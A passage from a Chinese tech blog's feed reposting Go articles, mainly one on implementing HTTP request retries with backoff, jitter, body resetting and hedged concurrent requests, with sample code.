class="hljs-keyword">for</span> &#123;<br>lock.Lock()<br>c := count<br>lock.Unlock()<br>runtime.Gosched() <span class="hljs-comment">// 交出时间片给协程</span><br><span class="hljs-keyword">if</span> c &gt; <span class="hljs-number">10</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用<code>sync/atomic</code>执行原子操作</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;sync/atomic&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">type</span> Map <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> m atomic.Value<br>m.Store(<span class="hljs-built_in">make</span>(Map))<br><span class="hljs-keyword">var</span> mu sync.Mutex <span class="hljs-comment">// used only by writers</span><br>read := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key <span class="hljs-type">string</span>)</span></span> (val <span class="hljs-type">string</span>) &#123;<br>m1 := m.Load().(Map)<br><span class="hljs-keyword">return</span> m1[key]<br>&#125;<br>insert := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key, val <span class="hljs-type">string</span>)</span></span> &#123;<br>mu.Lock() <span class="hljs-comment">// 与潜在写入同步</span><br><span class="hljs-keyword">defer</span> mu.Unlock()<br>m1 := m.Load().(Map) <span class="hljs-comment">// 导入struct当前数据</span><br>m2 := <span class="hljs-built_in">make</span>(Map)      <span class="hljs-comment">// 创建新值</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m1 &#123;<br>m2[k] = v<br>&#125;<br>m2[key] = val<br>m.Store(m2) <span class="hljs-comment">// 用新的替代当前对象</span><br>&#125;<br>_, _ = read, insert<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Go中如何正确重试请求?</title>
    <link href="/2022/12/29/%E5%9C%A8Go%E4%B8%AD%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E9%87%8D%E8%AF%95%E8%AF%B7%E6%B1%82/"/>
    <url>/2022/12/29/%E5%9C%A8Go%E4%B8%AD%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E9%87%8D%E8%AF%95%E8%AF%B7%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="在Go中如何正确重试请求"><a href="#在Go中如何正确重试请求" class="headerlink" title="在Go中如何正确重试请求"></a>在Go中如何正确重试请求</h1><blockquote><p>本文章转载自 luozhiyun很酷 的 <a href="https://mp.weixin.qq.com/s/NRbSCy-g7Utf7e6ql2rtYA">在Go中如何正确重试请求</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们平时在开发中肯定避不开的一个问题是如何在不可靠的网络服务中实现可靠的网络通信，其中 http 请求重试是经常用的技术。但是 Go 标准库 net&#x2F;http 实际上是没有重试这个功能的，所以本篇文章主要讲解如何在 Go 中实现请求重试。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一般而言，对于网络通信失败的处理分为以下几步：</p><ol><li>感知错误。通过不同的错误码来识别不同的错误，在HTTP中status code可以用来识别不同类型的错误；</li><li>重试决策。这一步主要用来减少不必要的重试，比如HTTP的4xx的错误，通常4xx表示的是客户端的错误，这时候客户端不应该进行重试操作，或者在业务中自定义的一些错误也不应该被重试。根据这些规则的判断可以有效的减少不必要的重试次数，提升响应速度；</li><li>重试策略。重试策略就包含了重试间隔时间，重试次数等。如果次数不够，可能并不能有效的覆盖这个短时间故障的时间段，如果重试次数过多，或者重试间隔太小，又可能造成大量的资源(CPU、内存、线程、网络)浪费。这个我们下面再说；</li><li>对冲策略。对冲是指在不等待响应的情况主动发送单次调用的多个请求，然后取首个返回的回包。这个概念是 grpc 中的概念，我把它也借用过来；</li><li>熔断降级；如果重试之后还是不行，说明这个故障不是短时间的故障，而是长时间的故障。那么可以对服务进行熔断降级，后面的请求不再重试，这段时间做降级处理，减少没必要的请求，等服务端恢复了之后再进行请求，这方面的实现很多 go-zero 、 sentinel 、hystrix-go，也蛮有意思的；</li></ol><h2 id="重试策略"><a href="#重试策略" class="headerlink" title="重试策略"></a>重试策略</h2><p>重试策略可以分为很多种，一方面要考虑到本次请求时长过长而影响到的业务忍受度，另一方面要考虑到重试会对下游服务产生过多的请求而带来的影响，总之就是一个trade-off的问题。</p><p>所以对于重试算法，一般是在重试之间加一个 gap 时间，算法一般可以总结出以下几条规则：</p><ul><li>线性间隔（Linear Backoff）：每次重试间隔时间是固定的进行重试，如每1s重试一次；</li><li>线性间隔+随机时间（Linear Jitter Backoff）：有时候每次重试间隔时间一致可能会导致多个请求在同一时间请求，那么我们可以加入一个随机时间，在线性间隔时间的基础上波动一个百分比的时间；</li><li>指数间隔（Exponential Backoff）：每次间隔时间是2指数型的递增，如等 3s 9s 27s后重试；</li><li>指数间隔+随机时间（Exponential Jitter Backoff）：这个就和第二个类似了，在指数递增的基础上添加一个波动时间；</li></ul><p>上面有两种策略都加入了<strong>扰动（jitter）</strong>，目的是防止<strong>惊群问题 （Thundering Herd Problem）</strong>的发生。</p><blockquote><p>In computer science, the <strong>thundering herd problem</strong> occurs when a large number of processes or threads waiting for an event are awoken when that event occurs, but only one process is able to handle the event. When the processes wake up, they will each try to handle the event, but only one will win. All processes will compete for resources, possibly freezing the computer, until the herd is calmed down again</p></blockquote><p>所谓惊群问题当许多进程都在等待被同一事件唤醒的时候，当事件发生后最后只有一个进程能获得处理。其余进程又造成阻塞，这会造成上下文切换的浪费。所以加入一个随机时间来避免同一时间同时请求服务端还是很有必要的。</p><h2 id="使用-net-x2F-http-重试所带来的问题"><a href="#使用-net-x2F-http-重试所带来的问题" class="headerlink" title="使用 net&#x2F;http 重试所带来的问题"></a>使用 net&#x2F;http 重试所带来的问题</h2><p>重试这个操作其实对于 Go 来说其实还不能直接加一个 for 循环根据次数来进行，对于 Get 请求重试的时候没有请求体，可以直接进行重试，但是对于 Post 请求来说需要把请求体放到<code>Reader</code> 里面，如下：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">req, _ := http.NewRequest(<span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, strings.NewReader(<span class="hljs-string">&quot;hello&quot;</span>))<br></code></pre></td></tr></table></figure><p>服务端收到请求之后就会从这个<code>Reader</code>中调用<code>Read()</code>函数去读取数据，通常情况当服务端去读取数据的时候，<code>offset</code>会随之改变，下一次再读的时候会从<code>offset</code>位置继续向后读取。所以如果直接重试，会出现读不到 <code>Reader</code>的情况。</p><p>我们可以先弄一个例子：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>  http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, http.HandlerFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>   time.Sleep(time.Millisecond * <span class="hljs-number">20</span>)<br>   body, _ := ioutil.ReadAll(r.Body)  <br>   fmt.Printf(<span class="hljs-string">&quot;received body with length %v containing: %v\n&quot;</span>, <span class="hljs-built_in">len</span>(body), <span class="hljs-type">string</span>(body))<br>   w.WriteHeader(http.StatusOK)<br>  &#125;))<br>  http.ListenAndServe(<span class="hljs-string">&quot;:8090&quot;</span>, <span class="hljs-literal">nil</span>)<br> &#125;()<br> fmt.Print(<span class="hljs-string">&quot;Try with bare strings.Reader\n&quot;</span>) <br> retryDo(req)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">retryDo</span><span class="hljs-params">()</span></span> &#123;<br> originalBody := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;abcdefghigklmnopqrst&quot;</span>)<br> reader := strings.NewReader(<span class="hljs-type">string</span>(originalBody))<br> req, _ := http.NewRequest(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>, reader)<br> client := http.Client&#123;<br>  Timeout: time.Millisecond * <span class="hljs-number">10</span>,<br> &#125;<br><br> <span class="hljs-keyword">for</span> &#123;<br>  _, err := client.Do(req)<br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   fmt.Printf(<span class="hljs-string">&quot;error sending the first time: %v\n&quot;</span>, err)<br>  &#125; <br>  time.Sleep(<span class="hljs-number">1000</span>)<br> &#125;<br>&#125;<br><br><span class="hljs-comment">// output:</span><br><span class="hljs-type">error</span> sending the first time: Post <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br><span class="hljs-type">error</span> sending the first time: Post <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>: http: ContentLength=<span class="hljs-number">20</span> with Body length <span class="hljs-number">0</span><br><span class="hljs-type">error</span> sending the first time: Post <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>: http: ContentLength=<span class="hljs-number">20</span> with Body length <span class="hljs-number">0</span><br>received body with length <span class="hljs-number">20</span> containing: abcdefghigklmnopqrst<br><span class="hljs-type">error</span> sending the first time: Post <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>: http: ContentLength=<span class="hljs-number">20</span> with Body length <span class="hljs-number">0</span><br>....<br></code></pre></td></tr></table></figure><p>在上面这个例子中，在客户端设值了 10ms 的超时时间。在服务端模拟请求处理超时情况，先sleep 20ms，然后再读请求数据，这样必然会超时。</p><p>当再次请求的时候，发现 client 请求的 Body 数据并不是我们预期的20个长度，而是 0，导致了 err。因此需要将Body这个<code>Reader </code>进行重置，如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resetBody</span><span class="hljs-params">(request *http.Request, originalBody []<span class="hljs-type">byte</span>)</span></span> &#123;<br> request.Body = io.NopCloser(bytes.NewBuffer(originalBody))<br> request.GetBody = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>  <span class="hljs-keyword">return</span> io.NopCloser(bytes.NewBuffer(originalBody)), <span class="hljs-literal">nil</span><br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面这段代码中，我们使用 io.NopCloser 对请求的 Body 数据进行了重置，避免下次请求的时候出现非预期的异常。</p><p>那么相对于上面简陋的例子，还可以完善一下，加上我们上面说的 StatusCode 重试判断、重试策略、重试次数等等，可以写成这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">retryDo</span><span class="hljs-params">(req *http.Request, maxRetries <span class="hljs-type">int</span>, timeout time.Duration,</span></span><br><span class="hljs-params"><span class="hljs-function"> backoffStrategy BackoffStrategy)</span></span> (*http.Response, <span class="hljs-type">error</span>) &#123;<br> <span class="hljs-keyword">var</span> (<br>  originalBody []<span class="hljs-type">byte</span><br>  err          <span class="hljs-type">error</span><br> )<br> <span class="hljs-keyword">if</span> req != <span class="hljs-literal">nil</span> &amp;&amp; req.Body != <span class="hljs-literal">nil</span> &#123;<br>  originalBody, err = copyBody(req.Body)<br>  resetBody(req, originalBody)<br> &#125;<br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br> &#125;<br> AttemptLimit := maxRetries<br> <span class="hljs-keyword">if</span> AttemptLimit &lt;= <span class="hljs-number">0</span> &#123;<br>  AttemptLimit = <span class="hljs-number">1</span><br> &#125;<br><br> client := http.Client&#123;<br>  Timeout: timeout,<br> &#125;<br> <span class="hljs-keyword">var</span> resp *http.Response<br>  <span class="hljs-comment">//重试次数</span><br> <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= AttemptLimit; i++ &#123;<br>  resp, err = client.Do(req)<br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   fmt.Printf(<span class="hljs-string">&quot;error sending the first time: %v\n&quot;</span>, err)<br>  &#125; <br>  <span class="hljs-comment">// 重试 500 以上的错误码</span><br>  <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; resp.StatusCode &lt; <span class="hljs-number">500</span> &#123;<br>   <span class="hljs-keyword">return</span> resp, err<br>  &#125;<br>  <span class="hljs-comment">// 如果正在重试，那么释放fd</span><br>  <span class="hljs-keyword">if</span> resp != <span class="hljs-literal">nil</span> &#123;<br>   resp.Body.Close()<br>  &#125;<br>  <span class="hljs-comment">// 重置body</span><br>  <span class="hljs-keyword">if</span> req.Body != <span class="hljs-literal">nil</span> &#123;<br>   resetBody(req, originalBody)<br>  &#125;<br>  time.Sleep(backoffStrategy(i) + <span class="hljs-number">1</span>*time.Microsecond)<br> &#125;<br> <span class="hljs-comment">// 到这里，说明重试也没用</span><br> <span class="hljs-keyword">return</span> resp, req.Context().Err()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyBody</span><span class="hljs-params">(src io.ReadCloser)</span></span> ([]<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br> b, err := ioutil.ReadAll(src)<br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, ErrReadingRequestBody<br> &#125;<br> src.Close()<br> <span class="hljs-keyword">return</span> b, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resetBody</span><span class="hljs-params">(request *http.Request, originalBody []<span class="hljs-type">byte</span>)</span></span> &#123;<br> request.Body = io.NopCloser(bytes.NewBuffer(originalBody))<br> request.GetBody = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (io.ReadCloser, <span class="hljs-type">error</span>) &#123;<br>  <span class="hljs-keyword">return</span> io.NopCloser(bytes.NewBuffer(originalBody)), <span class="hljs-literal">nil</span><br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对冲策略"><a href="#对冲策略" class="headerlink" title="对冲策略"></a>对冲策略</h2><p>上面讲的是重试的概念，那么有时候我们接口只是偶然会出问题，并且我们的下游服务并不在乎多请求几次，那么我们可以借用 grpc 里面的概念：<strong>对冲策略（Hedged requests）</strong>。</p><p><strong>对冲是指在不等待响应的情况主动发送单次调用的多个请求</strong>，然后取首个返回的回包。对冲和重试的区别点主要在：对冲在超过指定时间没有响应就会直接发起请求，而重试则必须要服务端响应后才会发起请求。所以对冲更像是比较激进的重试策略。</p><p>使用对冲的时候需要注意一点是，因为下游服务可能会做负载均衡策略，所以要求请求的下游服务一般是要求幂等的，能够在多次并发请求中是安全的，并且是符合预期的。</p><p>对冲请求一般是用来处理“长尾”请求的，关于”长尾“请求的概念可以看这篇文章：<a href="https://segmentfault.com/a/1190000039978117">https://segmentfault.com/a/1190000039978117</a></p><h3 id="并发模式的处理"><a href="#并发模式的处理" class="headerlink" title="并发模式的处理"></a>并发模式的处理</h3><p>因为对冲重试加上了并发的概念，要用到 goroutine 来并发请求，所以我们可以把数据封装到 channel 里面来进行消息的异步处理。</p><p>并且由于是多个goroutine处理消息，我们需要在每个goroutine处理完毕，但是都失败的情况下返回err，不能直接由于channel等待卡住主流程，这一点十分重要。</p><p>但是由于在 Go 中是无法获取每个 goroutine 的执行结果的，我们又只关注正确处理结果，需要忽略错误，所以需要配合 WaitGroup 来实现流程控制，示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> totalSentRequests := &amp;sync.WaitGroup&#123;&#125;<br> allRequestsBackCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br> multiplexCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span> &#123;<br>  result <span class="hljs-type">string</span><br>  retry  <span class="hljs-type">int</span><br> &#125;)<br> <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//所有请求完成之后会close掉allRequestsBackCh</span><br>  totalSentRequests.Wait()<br>  <span class="hljs-built_in">close</span>(allRequestsBackCh)<br> &#125;()<br> <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br>  totalSentRequests.Add(<span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">// 标记已经执行完</span><br>   <span class="hljs-keyword">defer</span> totalSentRequests.Done()<br>   <span class="hljs-comment">// 模拟耗时操作</span><br>   time.Sleep(<span class="hljs-number">500</span> * time.Microsecond)<br>   <span class="hljs-comment">// 模拟处理成功</span><br>   <span class="hljs-keyword">if</span> random.Intn(<span class="hljs-number">500</span>)%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &#123;<br>    multiplexCh &lt;- <span class="hljs-keyword">struct</span> &#123;<br>     result <span class="hljs-type">string</span><br>     retry  <span class="hljs-type">int</span><br>    &#125;&#123;<span class="hljs-string">&quot;finsh success&quot;</span>, i&#125;<br>   &#125;<br>   <span class="hljs-comment">// 处理失败不关心，当然，也可以加入一个错误的channel中进一步处理</span><br>  &#125;()<br> &#125;<br> <span class="hljs-keyword">select</span> &#123;<br> <span class="hljs-keyword">case</span> &lt;-multiplexCh:<br>  fmt.Println(<span class="hljs-string">&quot;finish success&quot;</span>)<br> <span class="hljs-keyword">case</span> &lt;-allRequestsBackCh:<br>  <span class="hljs-comment">// 到这里，说明全部的 goroutine 都执行完毕，但是都请求失败了</span><br>  fmt.Println(<span class="hljs-string">&quot;all req finish，but all fail&quot;</span>)<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上面这段代码看为了进行流程控制，多用了两个 channel ：totalSentRequests 、allRequestsBackCh，多用了一个 goroutine 异步关停 allRequestsBackCh，才实现的流程控制，实在太过于麻烦，有新的实现方案的同学不妨和我探讨一下。</p><p>除了上面的并发请求控制的问题，对于对冲重试来说，还需要注意的是，由于请求不是串行的，所以 http.Request 的上下文会变，所以每次请求前需要 clone 一次 context，保证每个不同请求的 context 是独立的。但是每次 clone 之后 <code>Reader </code>的<code>offset</code>位置又变了，所以我们还需要进行重新<code> reset</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">func <span class="hljs-selector-tag">main</span>() &#123;<br> req, _ := http.<span class="hljs-built_in">NewRequest</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, strings.<span class="hljs-built_in">NewReader</span>(<span class="hljs-string">&quot;hello&quot;</span>))<br> req2 := req.<span class="hljs-built_in">Clone</span>(req.<span class="hljs-built_in">Context</span>())<br> contents, _ := io.<span class="hljs-built_in">ReadAll</span>(req.Body)<br> contents2, _ := io.<span class="hljs-built_in">ReadAll</span>(req2.Body)<br> fmt.<span class="hljs-built_in">Printf</span>(<span class="hljs-string">&quot;First read: %v\n&quot;</span>, <span class="hljs-built_in">string</span>(contents))<br> fmt.<span class="hljs-built_in">Printf</span>(<span class="hljs-string">&quot;Second read: %v\n&quot;</span>, <span class="hljs-built_in">string</span>(contents2))<br>&#125;<br><br>//output:<br>First read: hello<br>Second read: <br></code></pre></td></tr></table></figure><p>所以结合一下上面的例子，我们可以将对冲重试的代码变为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">retryHedged</span><span class="hljs-params">(req *http.Request, maxRetries <span class="hljs-type">int</span>, timeout time.Duration,</span></span><br><span class="hljs-params"><span class="hljs-function"> backoffStrategy BackoffStrategy)</span></span> (*http.Response, <span class="hljs-type">error</span>) &#123;<br> <span class="hljs-keyword">var</span> (<br>  originalBody []<span class="hljs-type">byte</span><br>  err          <span class="hljs-type">error</span><br> )<br> <span class="hljs-keyword">if</span> req != <span class="hljs-literal">nil</span> &amp;&amp; req.Body != <span class="hljs-literal">nil</span> &#123;<br>  originalBody, err = copyBody(req.Body)<br> &#125;<br> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br> &#125;<br><br> AttemptLimit := maxRetries<br> <span class="hljs-keyword">if</span> AttemptLimit &lt;= <span class="hljs-number">0</span> &#123;<br>  AttemptLimit = <span class="hljs-number">1</span><br> &#125;<br><br> client := http.Client&#123;<br>  Timeout: timeout,<br> &#125;<br><br> <span class="hljs-comment">// 每次请求copy新的request</span><br> copyRequest := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (request *http.Request) &#123;<br>  request = req.Clone(req.Context())<br>  <span class="hljs-keyword">if</span> request.Body != <span class="hljs-literal">nil</span> &#123;<br>   resetBody(request, originalBody)<br>  &#125;<br>  <span class="hljs-keyword">return</span><br> &#125;<br><br> multiplexCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span> &#123;<br>  resp  *http.Response<br>  err   <span class="hljs-type">error</span><br>  retry <span class="hljs-type">int</span><br> &#125;)<br><br> totalSentRequests := &amp;sync.WaitGroup&#123;&#125;<br> allRequestsBackCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br> <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>  totalSentRequests.Wait()<br>  <span class="hljs-built_in">close</span>(allRequestsBackCh)<br> &#125;()<br> <span class="hljs-keyword">var</span> resp *http.Response<br> <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= AttemptLimit; i++ &#123;<br>  totalSentRequests.Add(<span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">// 标记已经执行完</span><br>   <span class="hljs-keyword">defer</span> totalSentRequests.Done()<br>   req = copyRequest()<br>   resp, err = client.Do(req)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;error sending the first time: %v\n&quot;</span>, err)<br>   &#125;<br>   <span class="hljs-comment">// 重试 500 以上的错误码</span><br>   <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; resp.StatusCode &lt; <span class="hljs-number">500</span> &#123;<br>    multiplexCh 